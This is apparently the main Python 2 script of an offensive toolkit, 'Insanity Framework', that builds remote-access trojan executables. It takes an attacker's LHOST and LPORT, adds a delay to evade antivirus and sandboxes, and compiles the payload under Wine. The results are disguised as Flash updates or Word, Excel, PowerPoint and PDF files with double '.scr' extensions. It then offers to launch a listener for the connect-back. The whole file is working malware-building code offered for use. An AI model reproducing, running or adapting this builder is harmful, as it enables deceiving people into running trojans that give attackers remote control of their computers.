#!/usr/bin/python
# -*- coding: iso-8859-15 -*-
# Copyright 2017 Insanity Framework (IF) 
# Written by: * Alisson Moretto - 4w4k3
# https://github.com/4w4k3/Insanity-Framework
# Licensed under the BSD-3-Clause
import os
import sys
import time
import os
import getpass

if not os.geteuid() == 0:
    sys.exit('Insanity must be run as root')

def clear():
    os.sytem('clear')
def help():
    print '''
- [I]ɴsᴀɴɪᴛʏ [F]ʀᴀᴍᴇᴡᴏʀᴋ -
    
ᴛʏᴘᴇ {0}L{1} - {0}[{1}ʟɪsᴛ ᴀʟʟ ᴀᴠᴀɪʟᴀʙʟᴇ ᴘᴀʏʟᴏᴀᴅs{0}]{1}
ᴛʏᴘᴇ {0}D{1} - {0}[{1}ᴜsᴇ ᴅᴇꜰᴀᴜʟᴛ ᴘᴀʏʟᴏᴀᴅ (ᴀᴅᴏʙᴇ ᴘᴅꜰ){0}]{1}
ᴛʏᴘᴇ {0}ʙᴀᴄᴋ{1} - {0}[{1}ʀᴇᴛᴜʀɴ ᴛᴏ ᴍᴀɪɴ ᴍᴇɴᴜ{0}]{1}
ᴛʏᴘᴇ {0}ǫᴜɪᴛ{1} - {0}[{1}ᴛᴏᴏʟ ᴇxɪᴛ{0}]{1}
'''.format(BLUE, END)

def option():
   print '! {0}[{1}1{0}]{1} Aᴅᴏʙᴇ Fʟᴀsʜ Uᴘᴅᴀᴛᴇ !'.format(RED, WHITE) + '\n' + '! {0}[{1}2{0}]{1} Fᴀᴋᴇ Wᴏʀᴅ ᴅᴏᴄx !'.format(RED, WHITE) + '\n' + '! {0}[{1}3{0}]{1} Fake Excel xlsx !'.format(RED, WHITE) + '\n' + '! {0}[{1}4{0}]{1} Fᴀᴋᴇ Pᴏᴡᴇʀᴘᴏɪɴᴛ ᴘᴘᴛx !'.format(RED, WHITE) + '\n' + '! {0}[{1}5{0}]{1} Fᴀᴋᴇ Aᴄʀᴏʙᴀᴛ ᴘᴅꜰ !'.format(RED, WHITE) + '\n'

def begin():
    os.system('python enc.py')
    host = raw_input('Type LHOST: ')
    port = raw_input('Type LPORT: ')

    template = open('Templates/insane_enc.py', 'r')
    o = template.read()

    payload = '#!/usr/bin/python\n'
    payload += '# -*- coding: iso-8859-15 -*-\n'
    payload += '#Propane Nightmare - Insanity\n'
    payload += 'import shutil\n'
    payload += 'import base64\n'
    payload += 'import socket\n'
    payload += 'import subprocess\n'
    payload += 'from platform import platform\n'
    payload += 'import sys\n'
    payload += 'import win32com.client\n'
    payload += 'from _winreg import *\n'
    payload += 'from time import sleep\n'
    payload += 'HOST = ' + "'" + host + "'" + '\n'
    payload += 'PORT = ' + port + '\n'
    payload += 'sleep(35)\n'
    payload += str(o)

    with open('new.py', 'w') as f:
        f.write(payload)
        f.close()	
    template.close()

if not os.geteuid() == 0:
    sys.exit('Script must be run as root')

def clear():
    os.system('clear')

BLUE, RED, WHITE, YELLOW, MAGENTA, GREEN, END = '\33[94m', '\033[91m', '\33[97m', '\33[93m', '\033[1;35m', '\033[1;32m', '\033[0m'

def heading():
    os.system('clear')

    sys.stdout.write(RED + '''         
        .n                   .                 .                  n.
  .   .dP                  dP                   9b                 9b.    .
 4    qXb         .       dX                     Xb       .        dXp     t
dX.    9Xb      .dXb    __                         __    dXb.     dXP     .Xb
9XXb._       _.dXXXXb dXXXXbo.                 .odXXXXb dXXXXb._       _.dXXP
 9XXXXXXXXXXXXXXXXXXXVXXXXXXXXOo.           .oOXXXXXXXXVXXXXXXXXXXXXXXXXXXXP
  `9XXXXXXXXXXXXXXXXXXXXX'~   ~`OOO8b   d8OOO'~   ~`XXXXXXXXXXXXXXXXXXXXXP'
    `9XXXXXXXXXXXP' `9XX'          `98v8P'          `XXP' `9XXXXXXXXXXXP'
        XXXXXXX       9X.          .db|db.          .XP       XXXXXXX
                        )b.  .dbo.dP'`v'`9b.odb.  .dX(
                      ,dXXXXXXXXXXXb     dXXXXXXXXXXXb.
                     dXXXXXXXXXXXP'   .   `9XXXXXXXXXXXb
                    dXXXXXXXXXXXXb   d|b   dXXXXXXXXXXXXb
                    9XXb'   `XXXXXb.dX|Xb.dXXXXX'   `dXXP
                     `'      9XXXXXX(   )XXXXXXP      `'
                              XXXX X.`v'.X XXXX
                              XP^X'`b   d'`X^XX
                              X. 9  `   '  P )X
                              `b  `       '  d'
                               `             '        ʙʏ: ''' + WHITE + '''ᴀʟɪssᴏɴ ᴍᴏʀᴇᴛᴛᴏ(''' + RED + '''4ᴡ4ᴋ3''' + WHITE + ''')''' + RED +  '''                                         
 -- [I]ɴsᴀɴɪᴛʏ [F]ʀᴀᴍᴇᴡᴏʀᴋ  --                                Version: 0.1
''' + BLUE + '''* -> Cʜᴏᴏsᴇ ᴀ ᴘᴀʏʟᴏᴀᴅ ꜰᴏʀᴍᴀᴛ ꜰʀᴏᴍ ᴍᴇɴᴜ: <- *
''' + '\n' + END)

def optionBanner():
    print '! {0}[{1}D{0}]{1} Dᴇꜰᴀᴜʟᴛ (ꜰʟᴀsʜ ᴜᴘᴅᴀᴛᴇ)  - {0}[{1}L{0}]{1} Lɪsᴛ Aʟʟ Aᴠᴀɪʟᴀʙʟᴇs !'.format(RED, WHITE) + '\n' + '                                                            {0}[{1}H{0}]{1} ʜᴇʟᴘ  {0}[{1}Q{0}]{1} ǫᴜɪᴛ'.format(RED, WHITE)


def pp():
    sys.stdout.write(RED + '''
$u       #$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$~
$#      `"$$$$$$$$$$$$$$$$$$$$$$$$$$|   [PROPANE         |$$$$$$$
$i        $$$$$$$$$$$$$$$$$$$$$$$$$$|         [NIGHTMARE |$$$$$$$$
$$        #$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$
#$.        $$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$#
 $$      $iW$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$$!
 $$i      $$$$$$$#"" `"""#$$$$$$$$$$$$$$$$$#""""""#$$$$$$$$$$$$$$$W
 #$$W    `$$$#"            "       !$$$$$`           `"#$$$$$$$$$$#
  $$$     ``                 ! !iuW$$$$$                 #$$$$$$$#
  #$$    $u                  $   $$$$$$$                  $$$$$$$~
   "#    #$$i.               #   $$$$$$$.                 `$$$$$$
          $$$$$i.                """#$$$$i.               .$$$$#
          $$$$$$$$!         .   `    $$$$$$$$$i           $$$$$
          `$$$$$  $iWW   .uW`        #$$$$$$$$$W.       .$$$$$$#
            "#$$$$$$$$$$$$#`          $$$$$$$$$$$iWiuuuW$$$$$$$$W
               !#""    ""             `$$$$$$$##$$$$$$$$$$$$$$$$
          i$$$$    .                   !$$$$$$ .$$$$$$$$$$$$$$$#
         $$$$$$$$$$`                    $$$$$$$$$Wi$$$$$$#"#$$`
         #$$$$$$$$$W.                   $$$$$$$$$$$#   ``
          `$$$$##$$$$!       i$u.  $. .i$$$$$$$$$#""''' + WHITE + '''   InSaNiTy FrAmEwOrK''' + RED + '''
             "     `#W       $$$$$$$$$$$$$$$$$$$`      u$#
                            W$$$$$$$$$$$$$$$$$$      $$$$W
                            $$`!$$$##$$$$``$$$$      $$$$!
                           i$" $$$$  $$#"`  """     W$$$$
''' + END)

def asker():
    header = ('{0}InSaNiTy{1} > {2}'.format(RED, WHITE, END))
    choice = raw_input(header)
    dt = str(time.strftime("%d/%m/%y")) + str(time.strftime("%H:%M:%S"))
      
    if choice.upper() == 'Q' or choice.upper() == 'EXIT':
        clear()
	pp()
        raise SystemExit
    if choice.upper() == 'Q' or choice.upper() == 'QUIT':
	clear()
	pp()
        raise SystemExit
    elif choice.upper() == 'E' or choice.upper() == 'EXIT':
	clear()
	pp()
        raise SystemExit
    elif choice.upper() == 'D':
        begin()
        os.system('wine /root/.wine/drive_c/Python27/python.exe /root/.wine/drive_c/Python27/Scripts/pyinstaller-script.py --noconsole -m Manifest/manifest.manifest --version-file=Resource/adobe.insane --upx-dir Utils/upx.exe -i Icons/flash.ico -F new.py')
        os.system('rm -Rf build new.spec new.py')
        name = 'Insane_Flash_.exe'
        os.rename('dist/new.exe', 'dist/' + name)
        clear()
        heading()
        os.system('sudo rm -Rf Templates/insane_enc.py')               
        print '{0}[*] Sᴀᴠᴇᴅ ᴛᴏ:  {1}'.format(GREEN, END) + 'dist/' + name
        print '''\n *{0} Fᴏʀ ʀᴇᴀsᴏɴ ᴛᴏ ʙʏᴘᴀss ᴍᴏsᴛ AVs ᴀɴᴅ Sᴀɴᴅʙᴏxᴇs,
                ʏᴏᴜʀ ᴘᴀʏʟᴏᴀᴅ ᴄᴀɴ ʟɪᴛᴛʟᴇ ᴅᴇʟᴀʏ ᴛᴏ ᴄᴏɴɴᴇᴄᴛ{1} *'''.format(BLUE, END)
        listen = raw_input('Sᴛᴀʀᴛ Lɪsᴛᴇɴᴇʀ ? (ʏ/ɴ) : ')
        if listen.upper() == 'Y':
            os.system('python2.7 striker.py')
            sys.exit(0)
        else:
            sys.exit(0)
    elif choice.upper() == '1':
        begin()
        os.system('wine /root/.wine/drive_c/Python27/python.exe /root/.wine/drive_c/Python27/Scripts/pyinstaller-script.py --noconsole -m Manifest/manifest.manifest --version-file=Resource/adobe.insane --upx-dir Utils/upx.exe -i Icons/flash.ico -F new.py')
        os.system('rm -Rf build new.spec new.py')
        name = 'Insane_Flash_.exe'
        os.rename('dist/new.exe', 'dist/' + name)
        clear()
        heading()
        os.system('sudo rm -Rf Templates/insane_enc.py')               
        print '{0}[*] Sᴀᴠᴇᴅ ᴛᴏ:  {1}'.format(GREEN, END) + 'dist/' + name
        print '''\n *{0} Fᴏʀ ʀᴇᴀsᴏɴ ᴛᴏ ʙʏᴘᴀss ᴍᴏsᴛ AVs ᴀɴᴅ Sᴀɴᴅʙᴏxᴇs,
                ʏᴏᴜʀ ᴘᴀʏʟᴏᴀᴅ ᴄᴀɴ ʟɪᴛᴛʟᴇ ᴅᴇʟᴀʏ ᴛᴏ ᴄᴏɴɴᴇᴄᴛ{1} *'''.format(BLUE, END)
        listen = raw_input('Sᴛᴀʀᴛ Lɪsᴛᴇɴᴇʀ ? (ʏ/ɴ) : ')
        if listen.upper() == 'Y':
            os.system('python2.7 striker.py')
            sys.exit(0)
        else:
            sys.exit(0)
    elif choice.upper() == '2':
        begin()
        os.system('wine /root/.wine/drive_c/Python27/python.exe /root/.wine/drive_c/Python27/Scripts/pyinstaller-script.py --noconsole -m Manifest/manifest.manifest --version-file=Resource/word.insane --upx-dir Utils/upx.exe -i Icons/word.ico -F new.py')
        os.system('rm -Rf build new.spec new.py')
        name = 'Insane_Word_.docx.scr'
        os.rename('dist/new.exe', 'dist/' + name)
        clear()
        heading()
        os.system('sudo rm -Rf Templates/insane_enc.py')               
        print '{0}[*] Sᴀᴠᴇᴅ ᴛᴏ:  {1}'.format(GREEN, END) + 'dist/' + name
        print '''\n *{0} Fᴏʀ ʀᴇᴀsᴏɴ ᴛᴏ ʙʏᴘᴀss ᴍᴏsᴛ AVs ᴀɴᴅ Sᴀɴᴅʙᴏxᴇs,
                ʏᴏᴜʀ ᴘᴀʏʟᴏᴀᴅ ᴄᴀɴ ʟɪᴛᴛʟᴇ ᴅᴇʟᴀʏ ᴛᴏ ᴄᴏɴɴᴇᴄᴛ{1} *'''.format(BLUE, END)        
        listen = raw_input('Sᴛᴀʀᴛ Lɪsᴛᴇɴᴇʀ ? (ʏ/ɴ) : ')
        if listen.upper() == 'Y':
            os.system('python2.7 striker.py')
            sys.exit(0)
        else:
            sys.exit(0)
    elif choice.upper() == '3':
        begin()
        os.system('wine /root/.wine/drive_c/Python27/python.exe /root/.wine/drive_c/Python27/Scripts/pyinstaller-script.py --noconsole -m Manifest/manifest.manifest --version-file=Resource/excel.insane --upx-dir Utils/upx.exe -i Icons/excel.ico -F new.py')
        os.system('rm -Rf build new.spec new.py')
        name = 'Insane_Excel_.xlsx.scr'
        os.rename('dist/new.exe', 'dist/' + name)
        clear()
        heading()
        os.system('sudo rm -Rf Templates/insane_enc.py')
        print '{0}[*] Sᴀᴠᴇᴅ ᴛᴏ:  {1}'.format(GREEN, END) + 'dist/' + name
        print '''\n *{0} Fᴏʀ ʀᴇᴀsᴏɴ ᴛᴏ ʙʏᴘᴀss ᴍᴏsᴛ AVs ᴀɴᴅ Sᴀɴᴅʙᴏxᴇs,
                ʏᴏᴜʀ ᴘᴀʏʟᴏᴀᴅ ᴄᴀɴ ʟɪᴛᴛʟᴇ ᴅᴇʟᴀʏ ᴛᴏ ᴄᴏɴɴᴇᴄᴛ{1} *'''.format(BLUE, END)
        listen = raw_input('Sᴛᴀʀᴛ Lɪsᴛᴇɴᴇʀ ? (ʏ/ɴ) : ')
        if listen.upper() == 'Y':
            os.system('python2.7 striker.py')
            sys.exit(0)
        else:
            sys.exit(0)
    elif choice == '4':
        begin()
        os.system('wine /root/.wine/drive_c/Python27/python.exe /root/.wine/drive_c/Python27/Scripts/pyinstaller-script.py --noconsole -m Manifest/manifest.manifest --version-file=Resource/powerpoint.insane --upx-dir Utils/upx.exe -i Icons/powerpoint.ico -F new.py')
        os.system('rm -Rf build new.spec new.py')
        name = 'Insane_Power_.pptx.scr'
        os.rename('dist/new.exe', 'dist/' + name)
        clear()
        heading()
        os.system('sudo rm -Rf Templates/insane_enc.py')
        print '{0}[*] Sᴀᴠᴇᴅ ᴛᴏ:  {1}'.format(GREEN, END) + 'dist/' + name
        print '''\n *{0} Fᴏʀ ʀᴇᴀsᴏɴ ᴛᴏ ʙʏᴘᴀss ᴍᴏsᴛ AVs ᴀɴᴅ Sᴀɴᴅʙᴏxᴇs,
                ʏᴏᴜʀ ᴘᴀʏʟᴏᴀᴅ ᴄᴀɴ ʟɪᴛᴛʟᴇ ᴅᴇʟᴀʏ ᴛᴏ ᴄᴏɴɴᴇᴄᴛ{1} *'''.format(BLUE, END)        
        listen = raw_input('Sᴛᴀʀᴛ Lɪsᴛᴇɴᴇʀ ? (ʏ/ɴ) : ')
        if listen.upper() == 'Y':
            os.system('python2.7 striker.py')
            sys.exit(0)
        else:
            sys.exit(0)
    elif choice.upper() == '5':
        begin()
        os.system('wine /root/.wine/drive_c/Python27/python.exe /root/.wine/drive_c/Python27/Scripts/pyinstaller-script.py --noconsole -m Manifest/manifest.manifest --version-file=Resource/acrobat.insane --upx-dir Utils/upx.exe -i Icons/acrobat.ico -F new.py')
        os.system('rm -Rf build new.spec new.py')
        name = 'Insane_AcrobatPDF_.pdf.scr'
        os.rename('dist/new.exe', 'dist/' + name)
        clear()
        heading()
        os.system('sudo rm -Rf Templates/insane_enc.py')
        print '{0}[*] Sᴀᴠᴇᴅ ᴛᴏ:  {1}'.format(GREEN, END) + 'dist/' + name
        print '''\n *{0} Fᴏʀ ʀᴇᴀsᴏɴ ᴛᴏ ʙʏᴘᴀss ᴍᴏsᴛ AVs ᴀɴᴅ Sᴀɴᴅʙᴏxᴇs,
                ʏᴏᴜʀ ᴘᴀʏʟᴏᴀᴅ ᴄᴀɴ ʟɪᴛᴛʟᴇ ᴅᴇʟᴀʏ ᴛᴏ ᴄᴏɴɴᴇᴄᴛ{1} *'''.format(BLUE, END)
        listen = raw_input('Sᴛᴀʀᴛ Lɪsᴛᴇɴᴇʀ ? (ʏ/ɴ) : ')
        if listen.upper() == 'Y':
            os.system('python2.7 striker.py')
            sys.exit(0)
        else:
            sys.exit(0)
    elif choice.upper() == 'H':
        help()	
    elif choice.upper() == 'IFCONFIG':
	os.system(str(choice)) 
        asker()
    elif choice.upper() == 'LS':
        os.system(str(choice))
        asker() 
    elif choice.upper() == 'L':
	option()
        asker() 
    elif choice.upper() == 'BACK':
	os.system('python2.7 insanity.py')
        sys.exit(0)
    else:             
	clear()            
	print 'Iɴᴠᴀʟɪᴅ Oᴘᴛɪᴏɴ'
        time.sleep(2)
        main()


def main():

    clear()

    heading()

    try:

        while True:
            dt = str(time.strftime("%d/%m/%y")) + str(time.strftime("%H:%M:%S"))
            optionBanner()

            header = ('{0}InSaNiTy{1} > {2}'.format(RED, WHITE, END))
            choice = raw_input(header)
            
            if choice.upper() == 'Q' or choice.upper() == 'QUIT':
		clear()
		pp()
                raise SystemExit
	    if choice.upper() == 'E' or choice.upper() == 'EXIT':
		clear()
		pp()
                raise SystemExit
            if choice.upper() == 'D':
                begin()
                os.system('wine /root/.wine/drive_c/Python27/python.exe /root/.wine/drive_c/Python27/Scripts/pyinstaller-script.py --noconfirm --noconsole -m Manifest/manifest.manifest --version-file=Resource/adobe.insane --upx-dir Utils/upx.exe -i Icons/flash.ico --hiddenimport socket -F new.py')
                os.system('rm -Rf build new.spec new.py')
                name = 'Insane_Flash_.exe'
                os.rename('dist/new.exe', 'dist/' + name)
                clear()
                heading()
                os.system('sudo rm -Rf Templates/insane_enc.py')               
                print '{0}[*] Sᴀᴠᴇᴅ ᴛᴏ:  {1}'.format(GREEN, END) + 'dist/' + name
                print '''\n *{0} Fᴏʀ ʀᴇᴀsᴏɴ ᴛᴏ ʙʏᴘᴀss ᴍᴏsᴛ AVs ᴀɴᴅ Sᴀɴᴅʙᴏxᴇs,
                ʏᴏᴜʀ ᴘᴀʏʟᴏᴀᴅ ᴄᴀɴ ʟɪᴛᴛʟᴇ ᴅᴇʟᴀʏ ᴛᴏ ᴄᴏɴɴᴇᴄᴛ{1} *'''.format(BLUE, END)
                listen = raw_input('Sᴛᴀʀᴛ Lɪsᴛᴇɴᴇʀ ? (ʏ/ɴ) : ')
                if listen.upper() == 'Y':
                    os.system('python2.7 striker.py')
                    sys.exit(0)
                else:
                    sys.exit(0)
            if choice == '1':
                begin()
                os.system('wine /root/.wine/drive_c/Python27/python.exe /root/.wine/drive_c/Python27/Scripts/pyinstaller-script.py --noconsole -m Manifest/manifest.manifest --version-file=Resource/adobe.insane --upx-dir Utils/upx.exe -i Icons/flash.ico -F new.py')
                os.system('rm -Rf build new.spec new.py')
                name = 'Insane_Flash_.exe'
                os.rename('dist/new.exe', 'dist/' + name)
                clear()
                heading()
                os.system('sudo rm -Rf Templates/insane_enc.py')               
                print '{0}[*] Sᴀᴠᴇᴅ ᴛᴏ:  {1}'.format(GREEN, END) + 'dist/' + name
                print '''\n *{0} Fᴏʀ ʀᴇᴀsᴏɴ ᴛᴏ ʙʏᴘᴀss ᴍᴏsᴛ AVs ᴀɴᴅ Sᴀɴᴅʙᴏxᴇs,
                ʏᴏᴜʀ ᴘᴀʏʟᴏᴀᴅ ᴄᴀɴ ʟɪᴛᴛʟᴇ ᴅᴇʟᴀʏ ᴛᴏ ᴄᴏɴɴᴇᴄᴛ{1} *'''.format(BLUE, END)
                listen = raw_input('Sᴛᴀʀᴛ Lɪsᴛᴇɴᴇʀ ? (ʏ/ɴ) : ')
                if listen.upper() == 'Y':
                    os.system('python2.7 striker.py')
                    sys.exit(0)
                else:
                    sys.exit(0)
            elif choice == '2':
                begin()
                os.system('wine /root/.wine/drive_c/Python27/python.exe /root/.wine/drive_c/Python27/Scripts/pyinstaller-script.py --noconsole -m Manifest/manifest.manifest --version-file=Resource/word.insane --upx-dir Utils/upx.exe -i Icons/word.ico -F new.py')
                os.system('rm -Rf build new.spec new.py')
                name = 'Insane_Word_.docx.scr'
                os.rename('dist/new.exe', 'dist/' + name)
                clear()
                heading()
                os.system('sudo rm -Rf Templates/insane_enc.py')                               
                print '{0}[*] Sᴀᴠᴇᴅ ᴛᴏ:  {1}'.format(GREEN, END) + 'dist/' + name
                print '''\n *{0} Fᴏʀ ʀᴇᴀsᴏɴ ᴛᴏ ʙʏᴘᴀss ᴍᴏsᴛ AVs ᴀɴᴅ Sᴀɴᴅʙᴏxᴇs,
                ʏᴏᴜʀ ᴘᴀʏʟᴏᴀᴅ ᴄᴀɴ ʟɪᴛᴛʟᴇ ᴅᴇʟᴀʏ ᴛᴏ ᴄᴏɴɴᴇᴄᴛ{1} *'''.format(BLUE, END)
                listen = raw_input('Sᴛᴀʀᴛ Lɪsᴛᴇɴᴇʀ ? (ʏ/ɴ) : ')
                if listen.upper() == 'Y':
                    os.system('python2.7 striker.py')
                    sys.exit(0)
                else:
                    sys.exit(0)
            elif choice == '3':
                begin()
                os.system('wine /root/.wine/drive_c/Python27/python.exe /root/.wine/drive_c/Python27/Scripts/pyinstaller-script.py --noconsole -m Manifest/manifest.manifest --version-file=Resource/excel.insane --upx-dir Utils/upx.exe -i Icons/excel.ico -F new.py')
                os.system('rm -Rf build new.spec new.py')
                name = 'Insane_Excel_.xlsx.scr'
                os.rename('dist/new.exe', 'dist/' + name)
                clear()
                heading()
                os.system('sudo rm -Rf Templates/insane_enc.py')                               
                print '{0}[*] Sᴀᴠᴇᴅ ᴛᴏ:  {1}'.format(GREEN, END) + 'dist/' + name
                print '''\n *{0} Fᴏʀ ʀᴇᴀsᴏɴ ᴛᴏ ʙʏᴘᴀss ᴍᴏsᴛ AVs ᴀɴᴅ Sᴀɴᴅʙᴏxᴇs,
                ʏᴏᴜʀ ᴘᴀʏʟᴏᴀᴅ ᴄᴀɴ ʟɪᴛᴛʟᴇ ᴅᴇʟᴀʏ ᴛᴏ ᴄᴏɴɴᴇᴄᴛ{1} *'''.format(BLUE, END)
                listen = raw_input('Sᴛᴀʀᴛ Lɪsᴛᴇɴᴇʀ ? (ʏ/ɴ) : ')
                if listen.upper() == 'Y':
                    os.system('python2.7 striker.py')
                    sys.exit(0)
                else:
                    sys.exit(0)
            elif choice == '4':
                begin()
                os.system('wine /root/.wine/drive_c/Python27/python.exe /root/.wine/drive_c/Python27/Scripts/pyinstaller-script.py --noconsole -m Manifest/manifest.manifest --version-file=Resource/powerpoint.insane --upx-dir Utils/upx.exe -i Icons/powerpoint.ico -F new.py')
                os.system('rm -Rf build new.spec new.py')
                name = 'Insane_Power_.pptx.scr'
                os.rename('dist/new.exe', 'dist/' + name)
                clear() 
                heading()
                os.system('sudo rm -Rf Templates/insane_enc.py')                               
                print '{0}[*] Sᴀᴠᴇᴅ ᴛᴏ:  {1}'.format(GREEN, END) + 'dist/' + name
                print '''\n *{0} Fᴏʀ ʀᴇᴀsᴏɴ ᴛᴏ ʙʏᴘᴀss ᴍᴏsᴛ AVs ᴀɴᴅ Sᴀɴᴅʙᴏxᴇs,
                ʏᴏᴜʀ ᴘᴀʏʟᴏᴀᴅ ᴄᴀɴ ʟɪᴛᴛʟᴇ ᴅᴇʟᴀʏ ᴛᴏ ᴄᴏɴɴᴇᴄᴛ{1} *'''.format(BLUE, END)
                listen = raw_input('Sᴛᴀʀᴛ Lɪsᴛᴇɴᴇʀ ? (ʏ/ɴ) : ')
                if listen.upper() == 'Y':
                    os.system('python2.7 striker.py')
                    sys.exit(0)
                else:
                    sys.exit(0)
            elif choice == '5':
                begin()
                os.system('wine /root/.wine/drive_c/Python27/python.exe /root/.wine/drive_c/Python27/Scripts/pyinstaller-script.py --noconsole -m Manifest/manifest.manifest --version-file=Resource/acrobat.insane --upx-dir Utils/upx.exe -i Icons/acrobat.ico -F new.py')
                os.system('rm -Rf build new.spec new.py')
                name = 'Insane_AcrobatPDF_.pdf.scr'
                os.rename('dist/new.exe', 'dist/' + name)
                clear()
                heading()
                os.system('sudo rm -Rf Templates/insane_enc.py')                               
                print '{0}[*] Sᴀᴠᴇᴅ ᴛᴏ:  {1}'.format(GREEN, END) + 'dist/' + name
                print '''\n *{0} Fᴏʀ ʀᴇᴀsᴏɴ ᴛᴏ ʙʏᴘᴀss ᴍᴏsᴛ AVs ᴀɴᴅ Sᴀɴᴅʙᴏxᴇs,
                ʏᴏᴜʀ ᴘᴀʏʟᴏᴀᴅ ᴄᴀɴ ʟɪᴛᴛʟᴇ ᴅᴇʟᴀʏ ᴛᴏ ᴄᴏɴɴᴇᴄᴛ{1} *'''.format(BLUE, END)
                listen = raw_input('Sᴛᴀʀᴛ Lɪsᴛᴇɴᴇʀ ? (ʏ/ɴ) : ')
                if listen.upper() == 'Y':
                    os.system('python2.7 striker.py')
                    sys.exit(0)
                else:
                    sys.exit(0)
	    elif choice.upper() == 'H':
                help()	
            elif choice.upper() == 'IFCONFIG':
		os.system(str(choice)) 
                asker()
            elif choice.upper() == 'LS':
		os.system(str(choice))
                asker() 
            elif choice.upper() == 'L':
		option()
                asker() 
            elif choice.upper() == 'BACK':
		os.system('python2.7 insanity.py')
                sys.exit(0)
            else:             
		clear()            
		print 'Iɴᴠᴀʟɪᴅ Oᴘᴛɪᴏɴ'
                time.sleep(2)
                main()
 

    except KeyboardInterrupt:
	clear()
	pp()
        sys.exit(0)

if __name__ == '__main__':

    main()



